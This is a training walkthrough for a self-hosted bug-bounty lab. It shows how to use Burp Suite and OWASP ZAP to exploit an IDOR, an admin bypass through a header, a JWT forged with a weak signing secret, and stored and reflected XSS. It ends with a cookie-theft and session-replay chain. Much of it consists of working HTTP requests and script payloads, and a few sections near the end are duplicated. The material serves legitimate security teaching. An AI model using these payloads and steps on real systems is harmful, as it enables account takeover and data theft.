# Burp And ZAP Walkthrough

This walkthrough shows how to use Burp Suite and OWASP ZAP against the `localbugbountylabendtoend` environment running on Parrot OS.

## Target URLs

- `http://app.acme.local:8080`
- `http://api.acme.local:8081`
- `http://admin.acme.local:8082`
- `http://storage.acme.local:9000`
- `http://storage.acme.local:9001`

## Before You Start

Make sure the lab is running:

```bash
cd ~/localbugbountylabendtoend
unset DOCKER_HOST
docker compose ps
```

Make sure `/etc/hosts` on Parrot resolves:

```text
127.0.0.1 app.acme.local api.acme.local admin.acme.local storage.acme.local
```

## Burp Suite Walkthrough

Start Burp:

```bash
burpsuite
```

### 1. Proxy setup

- Open Burp and create a temporary project
- Keep the default Proxy listener on `127.0.0.1:8080`
- Configure your browser to use Burp as the proxy
- Browse to `http://app.acme.local:8080`

### 2. Capture login and inspect the JWT flow

In the browser:

- go to `http://app.acme.local:8080`
- submit `alice / welcome123`

In Burp:

- inspect the `POST /login` request to the front end
- observe the returned JWT
- note that the front end stores it in a readable `session` cookie

Things to verify:

- no token expiration
- role appears inside the token payload
- weak secret is implied by later tampering success

Important note:

- Burp normally sees browser traffic only
- because the front end talks to the API server-side, you will usually not see the app's internal `POST /login` call to `api.acme.local` in Burp `HTTP history`
- you can still capture the JWT from the browser-facing `POST /login` response because the app sets it in the `session` cookie

### 2.1 Inspect the original JWT in Burp Decoder

After logging in as `alice / welcome123`:

- find the `session` cookie value in Burp
- or copy the JWT from the API login response
- send the token to `Decoder`

Safe Burp method:

1. Copy the full JWT.
2. Open the `Decoder` tab.
3. Paste the JWT into the top panel.
4. Copy just the first segment before the first `.` and decode it as `Base64URL`.
5. Copy just the second segment between the two `.` characters and decode it as `Base64URL`.

Expected original header:

```json
{"alg":"HS256","typ":"JWT"}
```

Expected original payload shape:

```json
{"sub":1,"username":"alice","role":"user","department":"engineering","iat":1774525900}
```

Important observations:

- `role` is `user`
- there is an `iat` claim
- there is no `exp` claim
- the token is still trusted for authorization decisions

### 3. Reproduce the IDOR with Repeater

Send this request to Repeater:

```http
GET /api/user?id=1 HTTP/1.1
Host: api.acme.local:8081
```

Then change:

- `id=1` to `id=2`
- `id=2` to `id=3`

Expected result:

- each user record is returned without authorization
- the admin record includes `adminpass` and `ADM-ROOT-KEY-2026`

### 4. Reproduce the admin bypass

Send this request to Repeater:

```http
GET /export HTTP/1.1
Host: admin.acme.local:8082
role: admin
```

Expected result:

- JSON export returns users, comments, MinIO creds, and bucket name

Try removing the header:

- response should fail with `Missing required header: role: admin`

### 5. Tamper with the JWT

Options in Burp:

- use Decoder to inspect the JWT payload
- manually edit a known-good token outside Burp and replay it in Repeater
- or mint a lab token with `tools/forge_admin_jwt.py`

Generate a forged admin token in the lab directory:

```bash
cd ~/localbugbountylabendtoend
python3 tools/forge_admin_jwt.py
```

That prints a valid admin token for:

- `sub=1`
- `username=alice`
- `role=admin`
- `department=engineering`

You can also read the saved values directly:

- original token source: `~/localbugbountylabendtoend/reports/login-alice-live.json`
- forged token source: `~/localbugbountylabendtoend/reports/forged_admin_jwt.txt`
- decoded comparison: `~/localbugbountylabendtoend/reports/jwt_compare.json`

### 5.1 Compare the original and forged token in Decoder

Paste both tokens into Burp Decoder one after the other and decode the payload segment as `Base64URL`.

Original payload:

```json
{"sub":1,"username":"alice","role":"user","department":"engineering","iat":1774525900}
```

Forged payload:

```json
{"sub":1,"username":"alice","role":"admin","department":"engineering"}
```

What changed:

- `role` changed from `user` to `admin`
- `sub` stayed `1`
- `username` stayed `alice`
- there is still no expiration

This is the exact business-logic failure:

- the API trusts the embedded role claim
- the weak secret lets you sign your own privileged token

### 5.2 Compare the payloads in Burp Comparer

Burp Comparer is useful here because it makes the claim changes obvious without manually scanning long JWT strings.

Recommended inputs:

- the decoded original payload from the live `alice` token
- the decoded forged payload from `tools/forge_admin_jwt.py`

Flow:

1. Decode the original token payload in `Decoder`.
2. Select the decoded JSON text.
3. Right-click and choose `Send to Comparer`.
4. Decode the forged token payload in `Decoder`.
5. Select the decoded JSON text.
6. Right-click and choose `Send to Comparer`.
7. Open the `Comparer` tab.
8. Choose the two items you just sent.
9. Use `Words` compare for the clearest JWT payload diff.

Expected side-by-side difference:

Original:

```json
{"sub":1,"username":"alice","role":"user","department":"engineering","iat":1774525900}
```

Forged:

```json
{"sub":1,"username":"alice","role":"admin","department":"engineering"}
```

What Burp should highlight:

- `role` changed from `user` to `admin`
- `iat` exists in the original token but not in the forged token
- `sub` and `username` remain unchanged

Why this matters:

- you are not impersonating a different account ID
- you are escalating the same low-privileged account by modifying only the trusted role claim
- the diff helps show that authorization is tied to attacker-controlled token content

Tip:

- If you want an even cleaner comparison, compare only the decoded payload segment instead of the full token.
- If you compare the full token, the signature and encoded payload will also differ, which adds visual noise.

## One Straight Burp Flow

This is the cleanest end-to-end Burp sequence using `HTTP history`, `Repeater`, `Decoder`, and `Comparer` in one pass.

### 1. Capture the login in HTTP history

1. Start Burp and browse to `http://app.acme.local:8080`.
2. Log in with `alice / welcome123`.
3. In `Proxy` -> `HTTP history`, find:
   - `GET /` to `app.acme.local:8080`
   - `POST /login` to `app.acme.local:8080`
4. Open the `POST /login` entry and inspect the response.
5. Copy the `session` cookie JWT from the response headers or cookie view.

What you get here:

- a valid low-privileged JWT for `alice`
- the exact token you will later compare against the forged token

### 2. Send an API request from HTTP history to Repeater

Burp only compares and replays requests it has seen or that you create manually, so first generate a direct API request in the browser:

1. Browse to `http://api.acme.local:8081/api/user?id=1`
2. In `HTTP history`, find:

```http
GET /api/user?id=1 HTTP/1.1
Host: api.acme.local:8081
```

3. Right-click it and choose `Send to Repeater`.

### 3. Prove the IDOR in Repeater

In Repeater:

1. Change:

```http
GET /api/user?id=1 HTTP/1.1
```

to:

```http
GET /api/user?id=3 HTTP/1.1
```

2. Click `Send`.

Expected result:

- you receive the admin record
- the response includes `admin@acme.local`
- the response includes `adminpass`
- the response includes `ADM-ROOT-KEY-2026`

### 4. Build the forged admin API request in Repeater

Either copy the forged token from:

- `~/localbugbountylabendtoend/reports/forged_admin_jwt.txt`

or generate a fresh one:

```bash
cd ~/localbugbountylabendtoend
python3 tools/forge_admin_jwt.py
```

Now in Repeater:

1. Reuse the request tab you already sent.
2. Change the path from `/api/user?id=3` to `/api/admin`.
3. Add the header:

```http
Authorization: Bearer <forged-admin-token>
```

Final request:

```http
GET /api/admin HTTP/1.1
Host: api.acme.local:8081
Authorization: Bearer <forged-admin-token>
```

4. Click `Send`.

Expected result:

- `200 OK`
- `requestedBy.role` is `admin`
- users, comments, and MinIO credentials are returned

### 5. Decode the original token in Decoder

1. Take the original `alice` token from the captured login response.
2. Open `Decoder`.
3. Paste the full JWT.
4. Copy the middle segment and decode it as `Base64URL`.
5. Copy the decoded JSON text.
6. Right-click and choose `Send to Comparer`.

Expected original payload:

```json
{"sub":1,"username":"alice","role":"user","department":"engineering","iat":1774525900}
```

### 6. Decode the forged token in Decoder

1. Paste the forged token into `Decoder`.
2. Copy the middle segment and decode it as `Base64URL`.
3. Copy the decoded JSON text.
4. Right-click and choose `Send to Comparer`.

Expected forged payload:

```json
{"sub":1,"username":"alice","role":"admin","department":"engineering"}
```

### 7. Diff them in Comparer

1. Open `Comparer`.
2. Select the two decoded payload items.
3. Choose `Words` compare.

Burp should highlight:

- `role` changed from `user` to `admin`
- `iat` exists only in the original token
- `sub` and `username` stayed the same

This gives you a clean demonstration that:

- the account identity did not change
- only the trusted authorization claim changed
- the API accepts that forged privilege level

### 8. Optional final pivot

To prove the separate admin-panel flaw in the same Burp session, create one more Repeater request:

```http
GET /export HTTP/1.1
Host: admin.acme.local:8082
role: admin
```

Expected result:

- full admin export
- MinIO credentials
- complete user directory

## One Straight Stored XSS Flow

This sequence keeps the whole stored XSS test inside Burp while still matching how the lab actually works.

### 1. Capture the browser-side comment submission

1. Browse to `http://app.acme.local:8080`.
2. In the comment form, enter:
   - `Display Name`: `tester`
   - `Comment / Profile Update`: `hello`
3. Turn `Intercept` on.
4. Submit the form.
5. Burp should catch a browser request like:

```http
POST /comment HTTP/1.1
Host: app.acme.local:8080
Content-Type: application/x-www-form-urlencoded

displayName=tester&content=hello
```

Important note:

- Burp sees this browser request to `app.acme.local`
- the front end then forwards the comment to the API server-side
- that internal app-to-API request usually does not appear in Burp `HTTP history`

### 2. Send the captured request to Repeater

1. Right-click the intercepted `POST /comment` request.
2. Choose `Send to Repeater`.
3. Click `Forward` or turn `Intercept` off so your browser is not blocked.

### 3. Swap in an XSS proof payload

In Repeater, replace the body with:

```text
displayName=tester&content=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
```

or use a quieter proof payload:

```text
displayName=tester&content=%3Cscript%3Edocument.body.insertAdjacentHTML('afterbegin','%3Cdiv%20id%3Dstored-xss-proof%3Estored-xss%20works%3C%2Fdiv%3E')%3C%2Fscript%3E
```

Then click `Send`.

Expected result:

- the front end accepts the request
- the response is a redirect back to `/`
- the payload is now stored in the backend comment feed

### 4. Confirm the payload executes in the app

1. In the browser, reload `http://app.acme.local:8080`.
2. Watch the rendered comment feed.

Expected result:

- the stored payload runs when the page renders comments
- with the alert payload, `document.cookie` is accessible
- with the quieter proof payload, the page gets a visible `stored-xss works` marker

Why this works:

- comments are rendered into the DOM without sanitization
- the `session` cookie is readable by JavaScript

### 5. Direct API version in Burp Repeater

If you want to test the storage behavior without going through the front end form, create a manual Repeater request directly to the API:

```http
POST /comment HTTP/1.1
Host: api.acme.local:8081
Content-Type: application/json

{"displayName":"tester","content":"<script>alert(document.cookie)</script>"}
```

Click `Send`, then reload:

- `http://app.acme.local:8080`

Expected result:

- the stored payload appears in the feed and executes there

### 6. Compare browser request versus API request

This lab is helpful because it lets you see both layers:

- browser-visible request:

```http
POST /comment HTTP/1.1
Host: app.acme.local:8080
Content-Type: application/x-www-form-urlencoded
```

- direct API request:

```http
POST /comment HTTP/1.1
Host: api.acme.local:8081
Content-Type: application/json
```

This is useful during real assessments because:

- the user-facing route may hide the true backend endpoint
- server-side forwarding can obscure where the vulnerable storage actually happens

### 7. Optional safer proof payload

If you do not want a popup, use this payload in Repeater:

```html
<img src=x onerror="document.body.insertAdjacentHTML('afterbegin','<div id=stored-xss-proof>stored-xss works</div>')">
```

This still proves HTML/JS execution without relying on `alert()`.

## One Straight Reflected XSS Flow

This sequence demonstrates the reflected XSS behavior on the profile preview route.

### 1. Capture the profile preview request

1. Browse to `http://app.acme.local:8080`.
2. Turn `Intercept` on.
3. Use the `Profile Preview` form.
4. Enter any temporary value in the bio field and submit.
5. Burp should catch a request like:

```http
GET /profile?bio=test HTTP/1.1
Host: app.acme.local:8080
```

### 2. Send the request to Repeater

1. Right-click the intercepted request.
2. Choose `Send to Repeater`.
3. Forward it or turn `Intercept` off so the browser is not blocked.

### 3. Replace the query with a reflected XSS payload

In Repeater, change the request line to:

```http
GET /profile?bio=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1
Host: app.acme.local:8080
```

Then click `Send`.

Expected result:

- the response body contains the decoded payload inside the profile preview HTML
- the payload is reflected directly into the DOM without sanitization

### 4. Confirm the response-side reflection in Burp

In the Repeater response, look for:

```html
<div class="preview"><script>alert(document.cookie)</script></div>
```

That is already enough to prove the reflected XSS sink exists.

### 5. Trigger the payload in the browser

To watch it execute in the browser, paste this URL into the browser:

```text
http://app.acme.local:8080/profile?bio=<script>alert(document.cookie)</script>
```

Expected result:

- the payload executes immediately when the preview page loads
- the script can access `document.cookie`

### 6. Safer visible proof payload

If you want a visible proof without a popup, use:

```http
GET /profile?bio=%3Cimg%20src%3Dx%20onerror%3D%22document.body.insertAdjacentHTML('afterbegin','%3Cdiv%20id%3Dreflected-xss-proof%3Ereflected-xss%20works%3C%2Fdiv%3E')%22%3E HTTP/1.1
Host: app.acme.local:8080
```

Expected result:

- the response reflects the payload
- the browser inserts a visible `reflected-xss works` marker

### 7. Why this differs from stored XSS

Stored XSS:

- payload is persisted first
- the victim triggers it later when viewing stored content

Reflected XSS:

- payload is returned immediately in the same request/response cycle
- the exploit is delivered by tricking a victim into loading a crafted URL

### 8. Recommended proof chain

For a clean reflected-XSS demonstration in Burp:

1. Capture `GET /profile?bio=...` in `HTTP history`.
2. Send it to `Repeater`.
3. Replace the `bio` parameter with an encoded script payload.
4. Show the reflected payload in the response body.
5. Load the same URL in the browser to demonstrate execution.

## One Straight Session Theft Demo Flow

This final sequence chains the lab issues the way a bug bounty report often would:

- capture a real session
- inject XSS
- reveal the victim's readable session cookie
- replay the stolen cookie to prove account takeover on the front end

This stays fully inside the local lab and does not require any external exfiltration server.

### 1. Capture a normal user session in Burp

1. Browse to `http://app.acme.local:8080`.
2. Log in as `alice / welcome123`.
3. In `HTTP history`, open the browser-facing `POST /login` response.
4. Copy the `session` cookie value set by the app.

Why this matters:

- the app stores the JWT in a JavaScript-readable cookie
- XSS can therefore access it through `document.cookie`

### 2. Create a stored XSS payload that prints the cookie into the page

The cleanest version is to inject directly into the API from Repeater:

```http
POST /comment HTTP/1.1
Host: api.acme.local:8081
Content-Type: application/json

{"displayName":"tester","content":"<img src=x onerror=\"document.body.insertAdjacentHTML('afterbegin','<pre id=stolen-session>'+document.cookie.replace(/</g,'&lt;')+'</pre>')\">"}
```

Click `Send`.

Expected result:

- the API stores the payload as a comment
- the front end will render it later without sanitization

### 3. Trigger the stored XSS in the browser

1. Reload `http://app.acme.local:8080`.
2. Look near the top of the page.

Expected result:

- the payload executes
- the page now displays a visible block like:

```text
session=<JWT value>
```

This is your local proof of session theft:

- no network exfiltration needed
- the token is visibly exposed in the victim page context

### 4. Copy the stolen cookie value

From the rendered page, copy only the JWT after:

```text
session=
```

That token is the victim session.

### 5. Replay the stolen session cookie in Repeater

Create a new Repeater request to the front end:

```http
GET / HTTP/1.1
Host: app.acme.local:8080
Cookie: session=<stolen-jwt>
```

Click `Send`.

Expected result:

- the response shows the `Current Session` card for the stolen user
- you have proven front-end account takeover by replaying the stolen session

### 6. Optional escalation after session theft

If the stolen token belongs to a privileged user, you can directly reuse it.

In this lab, even a low-privileged stolen token is still high impact because:

- it proves account takeover on the front end
- the token claims are readable
- the weak JWT secret lets you further forge or alter token privileges

Optional follow-up request:

```http
GET /api/admin HTTP/1.1
Host: api.acme.local:8081
Authorization: Bearer <stolen-or-tampered-jwt>
```

### 7. Reflected-XSS version of the same logic

If you want the same proof with the reflected route, load this in the browser:

```text
http://app.acme.local:8080/profile?bio=<img src=x onerror="document.body.insertAdjacentHTML('afterbegin','<pre id=stolen-session>'+document.cookie.replace(/</g,'&lt;')+'</pre>')">
```

Expected result:

- the profile preview page renders the payload
- the cookie appears visibly in the page

The difference is:

- stored XSS persists and affects later viewers
- reflected XSS requires getting a victim to load a crafted URL

Send:

```http
GET /api/admin HTTP/1.1
Host: api.acme.local:8081
Authorization: Bearer <forged-admin-token>
```

Expected result:

- the API trusts the forged `role: admin` claim
- admin-only response is returned

Burp tip:

- right-click a captured `GET /api/user?id=1` request
- send it to Repeater
- change the path to `/api/admin`
- add `Authorization: Bearer <forged-admin-token>`

### 6. Validate stored XSS

Use the front-end form or Repeater:

```http
POST /comment HTTP/1.1
Host: api.acme.local:8081
Content-Type: application/json

{"displayName":"tester","content":"<script>alert(document.cookie)</script>"}
```

Then browse back to:

- `http://app.acme.local:8080`

Expected result:

- the payload is rendered in the feed
- `document.cookie` is readable because the `session` cookie is not `HttpOnly`

### 7. Validate reflected XSS

Browse to:

```text
http://app.acme.local:8080/profile?bio=<script>alert(document.cookie)</script>
```

Expected result:

- the payload executes in the profile preview page

## ZAP Walkthrough

Start ZAP:

```bash
zaproxy
```

### 1. Quick Start

- Open the Quick Start tab
- Use the URL `http://app.acme.local:8080`
- Choose either Manual Explore or Automated Scan

Recommended:

- start with Manual Explore for cleaner lab traffic
- use Automated Scan after you have mapped the main paths

### 2. Spider the front end

Spider:

- `http://app.acme.local:8080`

Look for discovered paths:

- `/`
- `/login`
- `/comment`
- `/profile`
- `/logout`

### 3. Add the API and admin to the Sites tree

Visit these directly in ZAP or through the browser:

- `http://api.acme.local:8081/api/user?id=1`
- `http://admin.acme.local:8082/`
- `http://storage.acme.local:9000/public-assets/security-note.txt`

This gives ZAP visibility into:

- API routes
- admin responses
- storage exposure

### 4. Use Request Editor for access control testing

Take the `GET /api/user?id=1` request and edit:

- `id=1` to `id=3`

Take the admin request and add:

```http
role: admin
```

Expected result:

- direct confirmation of IDOR
- direct confirmation of broken admin authorization

### 5. Run Active Scan selectively

Recommended targets:

- `http://app.acme.local:8080`
- `http://api.acme.local:8081`
- `http://admin.acme.local:8082`

Focus on:

- missing security headers
- reflected input handling
- client-side script exposure

Note:

- ZAP may not automatically prove the business-logic flaws by itself
- use manual request editing for IDOR, header bypass, and forged JWT replay

## Suggested Demo Sequence

1. Use Burp Proxy to capture a normal login.
2. Use Burp Repeater to prove the IDOR on `/api/user?id=`.
3. Add `role: admin` in Repeater and dump `/export`.
4. Forge a JWT and replay it to `/api/admin`.
5. Submit a stored XSS payload and reload the app.
6. Open ZAP, spider `app.acme.local`, and active-scan the three web services.

## Useful Test Payloads

Stored or reflected XSS:

```html
<script>alert(document.cookie)</script>
```

Simple image-based proof:

```html
<img src=x onerror=alert(document.cookie)>
```

Admin header:

```http
role: admin
```

## Expected High-Value Findings

- plaintext user disclosure through the API
- full admin export with a single header
- admin API access with a forged JWT
- readable session cookie exposed to XSS
- public MinIO object access

## Notes

- Burp is strongest for request interception, replay, and header/cookie tampering.
- ZAP is strongest for site discovery, passive findings, and guided active scanning.
- Use both together: Burp for business-logic abuse, ZAP for broad web coverage.
